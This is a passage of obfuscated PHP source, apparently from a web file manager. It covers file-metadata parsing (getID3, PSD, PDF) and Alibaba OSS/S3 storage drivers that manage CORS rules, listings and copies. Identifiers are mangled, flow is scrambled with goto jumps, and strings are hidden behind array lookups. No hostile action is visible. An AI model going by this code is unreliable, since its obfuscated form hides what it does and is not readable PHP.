E†™Ş±èïÏ; E†™Ş±èïÏ: } } class GetInfo { private static $fileTypeArray; public static function get($A‰‚•—”¦) { $FóÚœ‘ë„¤ = IO::info($A‰‚•—”¦); return self::infoAdd($FóÚœ‘ë„¤); } public static function check() { } public static function infoAdd(&$cœ¿£Ú—‡«) { goto BßÒŸÇéÇ´; EÁ‚Äå±«ñ: return $cœ¿£Ú—‡«; goto aÄöŒïšŠ“; BßÒŸÇéÇ´: $a‚¡¢ªá‡ =& $_SERVER[¹÷ˆ§éÒ°ú]; static $D³—¼‚ğ; if (!$D³—¼‚ğ) { require SDK_DIR . $a‚¡¢ªá‡[1602]; $D³—¼‚ğ = new getID3(); } goto b‹•Í˜¿¤¨; b‰ğ’ãÂÜ: $A‚íåËËİ = self::arrayValueLimit($A‚íåËËİ); $A‚íåËËİ[$a‚¡¢ªá‡[383]] = $CÉíî»àº; $cœ¿£Ú—‡«[$a‚¡¢ªá‡[437]] = $A‚íåËËİ; goto EÁ‚Äå±«ñ; E­„÷ŸÃ»º: $CÉíî»àº = $cœ¿£Ú—‡«[$a‚¡¢ªá‡[172]]; try { if ($cœ¿£Ú—‡«[$a‚¡¢ªá‡[172]] == $a‚¡¢ªá‡[1604]) { $A‚íåËËİ = self::psdParse($a¿®´²ÇÂÄ); $CÉíî»àº = $a‚¡¢ªá‡[1605]; } else { if ($cœ¿£Ú—‡«[$a‚¡¢ªá‡[172]] == $a‚¡¢ªá‡[1606]) { $A‚íåËËİ = self::pdfParse($a¿®´²ÇÂÄ); } else { $CÉíî»àº = self::$fileTypeArray[$a‚¡¢ªá‡[1607]][$cœ¿£Ú—‡«[$a‚¡¢ªá‡[172]]]; $C·’—ê„Óí = self::$fileTypeArray[$a‚¡¢ªá‡[1608]][$CÉíî»àº][$a‚¡¢ªá‡[1609]]; $AÂª¾ÏŠ¶† = @$D³—¼‚ğ->analyze($a¿®´²ÇÂÄ, $cœ¿£Ú—‡«[$a‚¡¢ªá‡[89]], $cœ¿£Ú—‡«[$a‚¡¢ªá‡[38]]); $A‚íåËËİ = self::parseData($AÂª¾ÏŠ¶†, $C·’—ê„Óí, $cœ¿£Ú—‡«); } } } catch (Exception $DĞé’•½§Ì) { $A‚íåËËİ = array($a‚¡¢ªá‡[383] => $CÉíî»àº); } if (!$A‚íåËËİ) { return; } goto b‰ğ’ãÂÜ; b‹•Í˜¿¤¨: if (!$cœ¿£Ú—‡« || $cœ¿£Ú—‡«[$a‚¡¢ªá‡[39]] != $a‚¡¢ªá‡[179]) { return; } if (!self::support($cœ¿£Ú—‡«[$a‚¡¢ªá‡[172]]) || isset($cœ¿£Ú—‡«[$a‚¡¢ªá‡[437]])) { return; } $a¿®´²ÇÂÄ = $a‚¡¢ªá‡[1603] . $cœ¿£Ú—‡«[$a‚¡¢ªá‡[87]]; goto E­„÷ŸÃ»º; aÄöŒïšŠ“: } public static function support($D°’óïÏƒÒ) { goto EÀŠ¦ËÆ»; EÀŠ¦ËÆ»: $B¹ƒéÒšÑ  =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $D°’óïÏƒÒ = strtolower($D°’óïÏƒÒ); goto e¢‘³Óæ´µ; e¢‘³Óæ´µ: $cèšÈãò² = array($B¹ƒéÒšÑ [1606], $B¹ƒéÒšÑ [1604]); if (in_array($D°’óïÏƒÒ, $cèšÈãò²)) { return !0; } if (isset(self::$fileTypeArray[$B¹ƒéÒšÑ [1607]][$D°’óïÏƒÒ])) { return !0; } goto fÜ„Ô²¦²‡; fÜ„Ô²¦²‡: return !1; goto AÕ‰‚Å¼ï; AÕ‰‚Å¼ï: } public static function arrayValueLimit($eÇÍ†ËÏß, $f²İÖÛ„ = 5000) { if (!is_array($eÇÍ†ËÏß)) { return $eÇÍ†ËÏß; } foreach ($eÇÍ†ËÏß as $f‚‡¹ñì„ã => $BÊŞ–â…ÓŠ) { if (is_string($BÊŞ–â…ÓŠ) && strlen($BÊŞ–â…ÓŠ) > $f²İÖÛ„) { $eÇÍ†ËÏß[$f‚‡¹ñì„ã] = substr($BÊŞ–â…ÓŠ, 0, $f²İÖÛ„); } else { if (is_array($BÊŞ–â…ÓŠ)) { $eÇÍ†ËÏß[$f‚‡¹ñì„ã] = self::arrayValueLimit($BÊŞ–â…ÓŠ, $f²İÖÛ„); } } } return $eÇÍ†ËÏß; } private static function parseData($DİÍñÅéß, $cºš†ØƒŸ, $CäÂ¯‰×õé) { $EŒãí±÷ÇÄ =& $_SERVER[¹÷ˆ§éÒ°ú]; $E¤¶ˆªªô = $DİÍñÅéß[$EŒãí±÷ÇÄ[1610]]; $eÊ…ğœ¦‘Ë = array(); foreach ($cºš†ØƒŸ as $Fä¿Àãó¾‡ => $bøƒ˜ß¿½Ò) { foreach ($bøƒ˜ß¿½Ò as $Ağ×¬‘Ÿ±é) { if (is_array($Ağ×¬‘Ÿ±é)) { $BÎëëß†§ = self::parseData($DİÍñÅéß, $bøƒ˜ß¿½Ò, $CäÂ¯‰×õé); if ($BÎëëß†§) { $eÊ…ğœ¦‘Ë[$Fä¿Àãó¾‡] = $BÎëëß†§; } break; } $eÙ»×Áøñ = str_replace($EŒãí±÷ÇÄ[1380], $E¤¶ˆªªô, $Ağ×¬‘Ÿ±é); $BÎëëß†§ = _get($DİÍñÅéß, $eÙ»×Áøñ); $BÎëëß†§ = is_array($BÎëëß†§) ? $BÎëëß†§[0] : $BÎëëß†§; if ($BÎëëß†§) { break; } } if ($BÎëëß†§ || $BÎëëß†§ === 0 || $BÎëëß†§ === !1) { $BÎëëß†§ = self::valueReset($Ağ×¬‘Ÿ±é, $BÎëëß†§, $Fä¿Àãó¾‡); if ($BÎëëß†§ !== null) { $eÊ…ğœ¦‘Ë[$Fä¿Àãó¾‡] = $BÎëëß†§; } } } $eÊ…ğœ¦‘Ë = self::valueResetAll($eÊ…ğœ¦‘Ë, $CäÂ¯‰×õé); return $eÊ…ğœ¦‘Ë; } private static function psdParse($bêÏœš¼ôê) { $a—òëÎ¢½¨ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (IO::fileSubstr($bêÏœš¼ôê, 0, 4) != $a—òëÎ¢½¨[1611]) { return !1; } $c‡¨’»•Â› = getImageSize($bêÏœš¼ôê, $DÛÔæ¹®ÈÈ); if (!$c‡¨’»•Â›) { return; } $c†õÑ™¡ø÷ = array($a—òëÎ¢½¨[1526] => $c‡¨’»•Â›[0], $a—òëÎ¢½¨[1528] => $c‡¨’»•Â›[1]); return $c†õÑ™¡ø÷; } private static function pdfParse($BÊ¦±¡ŞÂï) { return FileParsePdf::parse($BÊ¦±¡ŞÂï); } private static function fileTypeParse() { $cîè¹áëß =& $_SERVER[¹÷ˆ§éÒ°ú]; $eÅ´˜Ï›À® = self::fileTypeArray(); $dÃ´¶²’ƒˆ = array(); foreach ($eÅ´˜Ï›À® as $EÙ˜î”Ö–À => $B‡·÷ùßƒî) { $f‰»ÁÌ¨  = _get($B‡·÷ùßƒî, $cîè¹áëß[172], $cîè¹áëß[43]); $D¥¶±êØ†± = is_string($f‰»ÁÌ¨ ) ? explode($cîè¹áëß[57], $f‰»ÁÌ¨ ) : $f‰»ÁÌ¨ ; if (!$D¥¶±êØ†±) { continue; } foreach ($D¥¶±êØ†± as $f‰»ÁÌ¨ ) { $f‰»ÁÌ¨  = strtolower(trim($f‰»ÁÌ¨ )); if (!$f‰»ÁÌ¨ ) { continue; } $dÃ´¶²’ƒˆ[$f‰»ÁÌ¨ ] = $EÙ˜î”Ö–À; } $eÅ´˜Ï›À®[$EÙ˜î”Ö–À][$cîè¹áëß[172]] = array_keys($dÃ´¶²’ƒˆ); $eÅ´˜Ï›À®[$EÙ˜î”Ö–À][$cîè¹áëß[1609]] = self::parseKeyMap($B‡·÷ùßƒî[$cîè¹áëß[1609]]); } return array($cîè¹áëß[1608] => $eÅ´˜Ï›À®, $cîè¹áëß[1607] => $dÃ´¶²’ƒˆ); } private static function parseKeyMap($EÒŸ†¬êó) { $a£«Ü©Ğ÷ =& $_SERVER[¹÷ˆ§éÒ°ú]; foreach ($EÒŸ†¬êó as $bÄè˜ùí„× => $ašÕïŞ‚) { if (is_array($ašÕïŞ‚)) { $BÎ‡§Äİ‹â = self::parseKeyMap($ašÕïŞ‚); if ($BÎ‡§Äİ‹â) { $EÒŸ†¬êó[$bÄè˜ùí„×] = $BÎ‡§Äİ‹â; } continue; } $e”¤àù˜˜é = explode($a£«Ü©Ğ÷[57], $ašÕïŞ‚); $cÅ¿¹Ì±Ê = array(); foreach ($e”¤àù˜˜é as $D–Š¾…èæµ) { $D–Š¾…èæµ = trim($D–Š¾…èæµ); if (!$D–Š¾…èæµ) { continue; } if (preg_match($a£«Ü©Ğ÷[1612], $D–Š¾…èæµ, $D«¹Ìîôï)) { $BÙõ¼î¿È¦ = explode($a£«Ü©Ğ÷[282], $D«¹Ìîôï[1]); foreach ($BÙõ¼î¿È¦ as $aÌ’‹ÔÅêã) { $cÅ¿¹Ì±Ê[] = str_replace($D«¹Ìîôï[0], $aÌ’‹ÔÅêã, $D–Š¾…èæµ); } } else { $cÅ¿¹Ì±Ê[] = $D–Š¾…èæµ; } } $EÒŸ†¬êó[$bÄè˜ùí„×] = $cÅ¿¹Ì±Ê; } return $EÒŸ†¬êó; } private static function valueResetAll($EÒ°¶ğ¨åÏ, $b¤Ã“Ë¼˜Ä) { goto D¸„·ÈŠ®; D¸„·ÈŠ®: $EŠà½íĞ¡£ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (isset($EÒ°¶ğ¨åÏ[$EŠà½íĞ¡£[1613]])) { $f”Ã¶óÍ°Á = ceil($EÒ°¶ğ¨åÏ[$EŠà½íĞ¡£[1613]]); $eá£¼Ëœ±‰ = intval($f”Ã¶óÍ°Á / 3600); $dìÀƒÈæÓ› = intval(($f”Ã¶óÍ°Á - $eá£¼Ëœ±‰ * 3600) / 60); $aÎŒŸø‹õ = $f”Ã¶óÍ°Á % 60; $EÒ°¶ğ¨åÏ[$EŠà½íĞ¡£[1614]] = sprintf($EŠà½íĞ¡£[1615], $eá£¼Ëœ±‰, $dìÀƒÈæÓ›, $aÎŒŸø‹õ); if ($eá£¼Ëœ±‰ == 0) { $EÒ°¶ğ¨åÏ[$EŠà½íĞ¡£[1614]] = sprintf($EŠà½íĞ¡£[1616], $dìÀƒÈæÓ›, $aÎŒŸø‹õ); } } $Döšñ¶¡âÊ = _get($EÒ°¶ğ¨åÏ, $EŠà½íĞ¡£[1617]); goto cà¿¤„­‚; f“¾ÃÆ”ë‰: return $EÒ°¶ğ¨åÏ; goto AÏ…”Ï˜Ô; cà¿¤„­‚: if ($Döšñ¶¡âÊ) { $Bª¢¶™–…À = IO_PATH_SYSTEM_TEMP . $EŠà½íĞ¡£[1618] . KodIO::hashPath($b¤Ã“Ë¼˜Ä) . $EŠà½íĞ¡£[1619]; $EÒ°¶ğ¨åÏ[$EŠà½íĞ¡£[1620]] = Action($EŠà½íĞ¡£[1621])->pluginCacheFileSet($Bª¢¶™–…À, $Döšñ¶¡âÊ); unset($EÒ°¶ğ¨åÏ[$EŠà½íĞ¡£[1622]][$EŠà½íĞ¡£[1605]]); } $Dİù£±¹¢õ = _get($EÒ°¶ğ¨åÏ, $EŠà½íĞ¡£[1623], $EŠà½íĞ¡£[43]); $bà¹¿ÃÅÖ· = _get($EÒ°¶ğ¨åÏ, $EŠà½íĞ¡£[1624], $EŠà½íĞ¡£[43]); goto dÒ¸¨–áˆ®; dÒ¸¨–áˆ®: $fâ‡äå÷”Ë = _get($EÒ°¶ğ¨åÏ, $EŠà½íĞ¡£[1625], $EŠà½íĞ¡£[43]); $CŠåØÙÒ›ö = $Dİù£±¹¢õ . $bà¹¿ÃÅÖ· . $fâ‡äå÷”Ë; if ($CŠåØÙÒ›ö && get_charset($CŠåØÙÒ›ö) != $EŠà½íĞ¡£[337]) { $EÒ°¶ğ¨åÏ[$EŠà½íĞ¡£[1622]][$EŠà½íĞ¡£[1332]] = iconv_to($EÒ°¶ğ¨åÏ[$EŠà½íĞ¡£[1622]][$EŠà½íĞ¡£[1332]], get_charset($CŠåØÙÒ›ö), $EŠà½íĞ¡£[337]); $EÒ°¶ğ¨åÏ[$EŠà½íĞ¡£[1622]][$EŠà½íĞ¡£[1626]] = iconv_to($EÒ°¶ğ¨åÏ[$EŠà½íĞ¡£[1622]][$EŠà½íĞ¡£[1626]], get_charset($CŠåØÙÒ›ö), $EŠà½íĞ¡£[337]); $EÒ°¶ğ¨åÏ[$EŠà½íĞ¡£[1622]][$EŠà½íĞ¡£[1627]] = iconv_to($EÒ°¶ğ¨åÏ[$EŠà½íĞ¡£[1622]][$EŠà½íĞ¡£[1627]], get_charset($CŠåØÙÒ›ö), $EŠà½íĞ¡£[337]); } goto f“¾ÃÆ”ë‰; AÏ…”Ï˜Ô: } private static function valueReset($A¿¼Õ’, $FÑë½Œ¼¬, $Bœ£Œ½š´˜) { $A¶õìó±Û =& $_SERVER[¹÷ˆ§éÒ°ú]; $e†Ü‰õ•öĞ = $A¶õìó±Û[1543]; switch ($A¿¼Õ’) { case $A¶õìó±Û[1628]: $FÑë½Œ¼¬ = $FÑë½Œ¼¬ == $A¶õìó±Û[95] ? $A¶õìó±Û[1629] : $A¶õìó±Û[1630]; break; case $A¶õìó±Û[1631]: $FÑë½Œ¼¬ = $FÑë½Œ¼¬ ? $FÑë½Œ¼¬ : null; break; default: break; } switch ($Bœ£Œ½š´˜) { case $A¶õìó±Û[1632]: $FÑë½Œ¼¬ = round($FÑë½Œ¼¬, 2); break; case $A¶õìó±Û[199]: case $A¶õìó±Û[119]: if ($FÑë½Œ¼¬ < 0) { $FÑë½Œ¼¬ = null; } else { if (is_numeric($FÑë½Œ¼¬)) { $FÑë½Œ¼¬ = date($e†Ü‰õ•öĞ, $FÑë½Œ¼¬); } } break; default: break; } return $FÑë½Œ¼¬; } private static function fileTypeArray() { $a†Ú¿Š¬‹« =& $_SERVER[¹÷ˆ§éÒ°ú]; return array($a†Ú¿Š¬‹«[1605] => array($a†Ú¿Š¬‹«[172] => $a†Ú¿Š¬‹«[1633] . $a†Ú¿Š¬‹«[1634], $a†Ú¿Š¬‹«[1609] => array($a†Ú¿Š¬‹«[1526] => $a†Ú¿Š¬‹«[1635], $a†Ú¿Š¬‹«[1528] => $a†Ú¿Š¬‹«[1636], $a†Ú¿Š¬‹«[1637] => $a†Ú¿Š¬‹«[1638], $a†Ú¿Š¬‹«[1639] => $a†Ú¿Š¬‹«[1640], $a†Ú¿Š¬‹«[199] => $a†Ú¿Š¬‹«[1641], $a†Ú¿Š¬‹«[119] => $a†Ú¿Š¬‹«[1642], $a†Ú¿Š¬‹«[1643] => $a†Ú¿Š¬‹«[1644], $a†Ú¿Š¬‹«[1645] => $a†Ú¿Š¬‹«[1646], $a†Ú¿Š¬‹«[1647] => $a†Ú¿Š¬‹«[1648], $a†Ú¿Š¬‹«[1649] => $a†Ú¿Š¬‹«[1650], $a†Ú¿Š¬‹«[1651] => $a†Ú¿Š¬‹«[1652], $a†Ú¿Š¬‹«[1653] => $a†Ú¿Š¬‹«[1654], $a†Ú¿Š¬‹«[1655] => $a†Ú¿Š¬‹«[1656], $a†Ú¿Š¬‹«[1657] => array($a†Ú¿Š¬‹«[1658] => $a†Ú¿Š¬‹«[1659], $a†Ú¿Š¬‹«[1660] => $a†Ú¿Š¬‹«[1661], $a†Ú¿Š¬‹«[1662] => $a†Ú¿Š¬‹«[1663]), $a†Ú¿Š¬‹«[1664] => $a†Ú¿Š¬‹«[1665], $a†Ú¿Š¬‹«[1666] => $a†Ú¿Š¬‹«[1667], $a†Ú¿Š¬‹«[1668] => $a†Ú¿Š¬‹«[1669], $a†Ú¿Š¬‹«[1670] => $a†Ú¿Š¬‹«[1671], $a†Ú¿Š¬‹«[1672] => array($a†Ú¿Š¬‹«[1673] => $a†Ú¿Š¬‹«[1674], $a†Ú¿Š¬‹«[1675] => $a†Ú¿Š¬‹«[1676], $a†Ú¿Š¬‹«[1677] => $a†Ú¿Š¬‹«[1678], $a†Ú¿Š¬‹«[1679] => $a†Ú¿Š¬‹«[1680], $a†Ú¿Š¬‹«[1681] => $a†Ú¿Š¬‹«[1682], $a†Ú¿Š¬‹«[1683] => $a†Ú¿Š¬‹«[1684], $a†Ú¿Š¬‹«[1685] => $a†Ú¿Š¬‹«[1686], $a†Ú¿Š¬‹«[1687] => $a†Ú¿Š¬‹«[1688], $a†Ú¿Š¬‹«[1689] => $a†Ú¿Š¬‹«[1690], $a†Ú¿Š¬‹«[1691] => $a†Ú¿Š¬‹«[1692], $a†Ú¿Š¬‹«[1693] => $a†Ú¿Š¬‹«[1694]))), $a†Ú¿Š¬‹«[1695] => array($a†Ú¿Š¬‹«[172] => $a†Ú¿Š¬‹«[1696] . $a†Ú¿Š¬‹«[1697], $a†Ú¿Š¬‹«[1609] => array($a†Ú¿Š¬‹«[1613] => $a†Ú¿Š¬‹«[1698], $a†Ú¿Š¬‹«[199] => $a†Ú¿Š¬‹«[1699], $a†Ú¿Š¬‹«[119] => $a†Ú¿Š¬‹«[1700], $a†Ú¿Š¬‹«[1645] => $a†Ú¿Š¬‹«[1701], $a†Ú¿Š¬‹«[1702] => $a†Ú¿Š¬‹«[1703], $a†Ú¿Š¬‹«[1704] => $a†Ú¿Š¬‹«[1631], $a†Ú¿Š¬‹«[1705] => $a†Ú¿Š¬‹«[1706], $a†Ú¿Š¬‹«[1707] => $a†Ú¿Š¬‹«[1708], $a†Ú¿Š¬‹«[1709] => $a†Ú¿Š¬‹«[1710], $a†Ú¿Š¬‹«[1622] => array($a†Ú¿Š¬‹«[1332] => $a†Ú¿Š¬‹«[1711], $a†Ú¿Š¬‹«[1626] => $a†Ú¿Š¬‹«[1712], $a†Ú¿Š¬‹«[1627] => $a†Ú¿Š¬‹«[1713], $a†Ú¿Š¬‹«[1714] => $a†Ú¿Š¬‹«[1715], $a†Ú¿Š¬‹«[1716] => $a†Ú¿Š¬‹«[1717], $a†Ú¿Š¬‹«[1718] => $a†Ú¿Š¬‹«[1719], $a†Ú¿Š¬‹«[1605] => $a†Ú¿Š¬‹«[1720]))), $a†Ú¿Š¬‹«[1721] => array($a†Ú¿Š¬‹«[172] => $a†Ú¿Š¬‹«[1722] . $a†Ú¿Š¬‹«[1723], $a†Ú¿Š¬‹«[1609] => array($a†Ú¿Š¬‹«[1526] => $a†Ú¿Š¬‹«[1724], $a†Ú¿Š¬‹«[1528] => $a†Ú¿Š¬‹«[1725], $a†Ú¿Š¬‹«[1613] => $a†Ú¿Š¬‹«[1698], $a†Ú¿Š¬‹«[199] => $a†Ú¿Š¬‹«[1726], $a†Ú¿Š¬‹«[119] => $a†Ú¿Š¬‹«[1727], $a†Ú¿Š¬‹«[1632] => $a†Ú¿Š¬‹«[1728], $a†Ú¿Š¬‹«[1709] => $a†Ú¿Š¬‹«[1729], $a†Ú¿Š¬‹«[1705] => $a†Ú¿Š¬‹«[1730], $a†Ú¿Š¬‹«[1645] => $a†Ú¿Š¬‹«[1731], $a†Ú¿Š¬‹«[1695] => array($a†Ú¿Š¬‹«[1704] => $a†Ú¿Š¬‹«[1631], $a†Ú¿Š¬‹«[1732] => $a†Ú¿Š¬‹«[1733], $a†Ú¿Š¬‹«[1702] => $a†Ú¿Š¬‹«[1703], $a†Ú¿Š¬‹«[1709] => $a†Ú¿Š¬‹«[1710], $a†Ú¿Š¬‹«[1705] => $a†Ú¿Š¬‹«[1734], $a†Ú¿Š¬‹«[1707] => $a†Ú¿Š¬‹«[1708]))), $a†Ú¿Š¬‹«[1735] => array($a†Ú¿Š¬‹«[1609] => array($a†Ú¿Š¬‹«[1736] => $a†Ú¿Š¬‹«[1737], $a†Ú¿Š¬‹«[1738] => $a†Ú¿Š¬‹«[1739])), $a†Ú¿Š¬‹«[1740] => array($a†Ú¿Š¬‹«[1609] => array())); } } goto bìâœ–½ñ; A¥ÀÙƒ£‡‘: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($aãŸšÖÕì–) { parent::__construct($aãŸšÖÕì–); $this->signatureVersion($_SERVER[¹÷ˆ§éÒ°ú][212]); } public function fileOutLink($A°±Õ‘¨ ) { $D„®Éò—¾ß =& $_SERVER[¹÷ˆ§éÒ°ú]; if (substr($A°±Õ‘¨ , 0, 7) == $D„®Éò—¾ß[1106]) { $A°±Õ‘¨  = $D„®Éò—¾ß[1107] . substr($A°±Õ‘¨ , 7); } header($D„®Éò—¾ß[168] . $A°±Õ‘¨ ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($d–°–•è·ä) { parent::__construct(); include_once SDK_DIR . $_SERVER[¹÷ˆ§éÒ°ú][1162]; $this->_init($d–°–•è·ä); } public function _init($e¢’ğğ…ÔÏ) { foreach ($e¢’ğğ…ÔÏ as $a¯Ş”öÍÍê => $DòèËˆ‘ÔÎ) { if (isset($this->{$a¯Ş”öÍÍê})) { $this->{$a¯Ş”öÍÍê} = $DòèËˆ‘ÔÎ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¹÷ˆ§éÒ°ú][1163], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto aËê—Œ¶İš; C†ê¹×‘é: $Có¯ù­¾Â¶->addRule($dÛÙÄŞäºƒ); try { $this->client->putBucketCors($this->bucket, $Có¯ù­¾Â¶); } catch (OSS\Core\OssException $E¥¦¹ô‡í¥) { return !1; } return !0; goto Fä…ÍÈ¼É¹; aËê—Œ¶İš: $D²ƒ·ùìÍÆ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Có¯ù­¾Â¶ = new OSS\Model\CorsConfig(); $dÛÙÄŞäºƒ = new OSS\Model\CorsRule(); goto Aé²œŠ·; B½Ëš—Ä: $dÛÙÄŞäºƒ->addAllowedMethod($D²ƒ·ùìÍÆ[1167]); $dÛÙÄŞäºƒ->addAllowedMethod($D²ƒ·ùìÍÆ[1168]); $dÛÙÄŞäºƒ->addAllowedMethod($D²ƒ·ùìÍÆ[167]); goto då°–ˆ; då°–ˆ: $dÛÙÄŞäºƒ->setMaxAgeSeconds(600); $dÛÙÄŞäºƒ->addExposeHeader($D²ƒ·ùìÍÆ[1169]); $dÛÙÄŞäºƒ->addAllowedHeader($D²ƒ·ùìÍÆ[1164]); goto C†ê¹×‘é; Aé²œŠ·: $dÛÙÄŞäºƒ->addAllowedOrigin($D²ƒ·ùìÍÆ[1164]); $dÛÙÄŞäºƒ->addAllowedMethod($D²ƒ·ùìÍÆ[1165]); $dÛÙÄŞäºƒ->addAllowedMethod($D²ƒ·ùìÍÆ[1166]); goto B½Ëš—Ä; Fä…ÍÈ¼É¹: } public function getBucketCors() { goto C±½¿´Æ•›; f¿ë¾Œ…‚é: return array($d²êòâæËÎ[187] => isset($eè¡¾š[0]) ? $eè¡¾š[0] : $d²êòâæËÎ[43], $d²êòâæËÎ[191] => $A‰ïŒ‹·×, $d²êòâæËÎ[1170] => $e¿ÔÎØ¶‹è, $d²êòâæËÎ[1171] => isset($AŸè­»‹ßã[0]) ? $AŸè­»‹ßã[0] : $d²êòâæËÎ[43], $d²êòâæËÎ[189] => isset($ağõïÜŠã°[0]) ? $ağõïÜŠã°[0] : $d²êòâæËÎ[43]); goto E¶Á§«áÜ‘; FîŠöˆÂèŸ: $e¿ÔÎØ¶‹è = $dĞéîèğÍê[0]->getMaxAgeSeconds(); $AŸè­»‹ßã = $dĞéîèğÍê[0]->getExposeHeaders(); $ağõïÜŠã° = $dĞéîèğÍê[0]->getAllowedHeaders(); goto f¿ë¾Œ…‚é; a‘«Åëğ™: if (!$d«Í·ÈÑç || !($dĞéîèğÍê = $d«Í·ÈÑç->getRules())) { return null; } $eè¡¾š = $dĞéîèğÍê[0]->getAllowedOrigins(); $A‰ïŒ‹·× = $dĞéîèğÍê[0]->getAllowedMethods(); goto FîŠöˆÂèŸ; C±½¿´Æ•›: $d²êòâæËÎ =& $_SERVER[¹÷ˆ§éÒ°ú]; $d«Í·ÈÑç = null; try { $d«Í·ÈÑç = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Bœñ¾ë’Š) { return null; } goto a‘«Åëğ™; E¶Á§«áÜ‘: } public function isBucketCors() { goto bíéÒ¿‹„î; a–Óø›Œ¬Ö: if ($f•÷ßòÎ†[$f¼¹›®Ê½Ä[187]] != $f¼¹›®Ê½Ä[188] || $f•÷ßòÎ†[$f¼¹›®Ê½Ä[189]] != $f¼¹›®Ê½Ä[188]) { return !1; } $A¾ ¹›Å˜İ = array_map($f¼¹›®Ê½Ä[190], $f•÷ßòÎ†[$f¼¹›®Ê½Ä[191]]); if (!is_array($A¾ ¹›Å˜İ)) { $A¾ ¹›Å˜İ = array(); } goto a¼Ñí¢°êá; bíéÒ¿‹„î: $f¼¹›®Ê½Ä =& $_SERVER[¹÷ˆ§éÒ°ú]; $f•÷ßòÎ† = $this->getBucketCors(); if (!$f•÷ßòÎ† || !is_array($f•÷ßòÎ†)) { return !1; } goto a–Óø›Œ¬Ö; a¼Ñí¢°êá: $F‡¿ä·Å°¨ = array($f¼¹›®Ê½Ä[192], $f¼¹›®Ê½Ä[193], $f¼¹›®Ê½Ä[194], $f¼¹›®Ê½Ä[195], $f¼¹›®Ê½Ä[196]); $aÅöîòóÁÄ = array_diff($F‡¿ä·Å°¨, $A¾ ¹›Å˜İ); return empty($aÅöîòóÁÄ); goto aÇµÓïÑ Ô; aÇµÓïÑ Ô: } public function mkfile($BŒÒÛĞ«»½, $eæÓöõÓ” = '', $E©©‰¶ƒ®‘ = REPEAT_RENAME) { $cèìĞÌòÖ… = $this->setContent($BŒÒÛĞ«»½, $eæÓöõÓ”); if ($cèìĞÌòÖ… !== !1) { return $this->getPathOuter($BŒÒÛĞ«»½); } return !1; } public function mkdir($aŞŒ’††šË, $Dë˜ˆé°Šƒ = REPEAT_SKIP) { if ($this->_isFolder($aŞŒ’††šË)) { return $this->getPathOuter($aŞŒ’††šË); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($aŞŒ’††šË)); } catch (OSS\Core\OssException $ašî°Ôù) { return !1; } return $this->getPathOuter($aŞŒ’††šË); } private function fileList($cô›ñ¯«Ô, $Dø¬‹Äî‹Û = '', $cµœØÎœ‰Ä = 0) { goto B“ª¯‹§ˆÆ; B“ª¯‹§ˆÆ: $CÜòÏ¤†¢˜ =& $_SERVER[¹÷ˆ§éÒ°ú]; $cô›ñ¯«Ô = trim($cô›ñ¯«Ô, $CÜòÏ¤†¢˜[18]); $FÇ´²–¦‚¼ = empty($cô›ñ¯«Ô) ? $CÜòÏ¤†¢˜[43] : $cô›ñ¯«Ô . $CÜòÏ¤†¢˜[18]; goto A«ÅºÊÌÖ›; A«ÅºÊÌÖ›: $f©“É‰˜± = $CÜòÏ¤†¢˜[43]; $EÉ±¨ˆ¸¼Ñ = 1000; $F©¬×ªİˆ´ = $BÈ§âƒ“§è = array(); goto eŞ¼‚šŸ®¡; eŞ¼‚šŸ®¡: while (!0) { $aİÀ‡÷ˆË† = array($CÜòÏ¤†¢˜[1172] => $Dø¬‹Äî‹Û, $CÜòÏ¤†¢˜[198] => $FÇ´²–¦‚¼, $CÜòÏ¤†¢˜[1173] => $EÉ±¨ˆ¸¼Ñ, $CÜòÏ¤†¢˜[1174] => $f©“É‰˜±); try { $D‹ß®ŒÇí‡ = $this->client->listObjects($this->bucket, $aİÀ‡÷ˆË†); } catch (OSS\Core\OssException $FöŒæÉ ) { break; } $f©“É‰˜± = $D‹ß®ŒÇí‡->getNextMarker(); $CàôÉ¡ÁŞè = $D‹ß®ŒÇí‡->getObjectList(); $b›„è£æÛ = $D‹ß®ŒÇí‡->getPrefixList(); foreach ($CàôÉ¡ÁŞè as $C¬ƒˆä¨ìÃ) { if ($C¬ƒˆä¨ìÃ->getKey() == $FÇ´²–¦‚¼) { continue; } $DÂ÷Úé–˜² = $C¬ƒˆä¨ìÃ->getKey(); if ($cµœØÎœ‰Ä) { $DÂ÷Úé–˜² = array($CÜòÏ¤†¢˜[38] => $DÂ÷Úé–˜², $CÜòÏ¤†¢˜[89] => $C¬ƒˆä¨ìÃ->getSize(), $CÜòÏ¤†¢˜[202] => strtotime($C¬ƒˆä¨ìÃ->getLastModified())); } $BÈ§âƒ“§è[] = $DÂ÷Úé–˜²; } foreach ($b›„è£æÛ as $Eİø×æÕ§Ø) { $F©¬×ªİˆ´[] = $Eİø×æÕ§Ø->getPrefix(); } if ($f©“É‰˜± === $CÜòÏ¤†¢˜[43]) { break; } } return array($CÜòÏ¤†¢˜[86] => $F©¬×ªİˆ´, $CÜòÏ¤†¢˜[85] => $BÈ§âƒ“§è); goto A‰Ë°¾øÆ¼; A‰Ë°¾øÆ¼: } public function copyFile($fì¢ª–ó‰, $EÛ¤’¬Ú§Ó) { $Fñ“ŞÃ™ºÚ = $this->size($fì¢ª–ó‰); if ($Fñ“ŞÃ™ºÚ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $fì¢ª–ó‰, $this->bucket, $this->pathEncode($EÛ¤’¬Ú§Ó)); } catch (OSS\Core\OssException $DÌÊˆê‚•) { return !1; } return $this->getPathOuter($EÛ¤’¬Ú§Ó); } $C¿ƒø¢™˜« = $this->multiCopyObject($fì¢ª–ó‰, $EÛ¤’¬Ú§Ó, $Fñ“ŞÃ™ºÚ); return $C¿ƒø¢™˜« ? 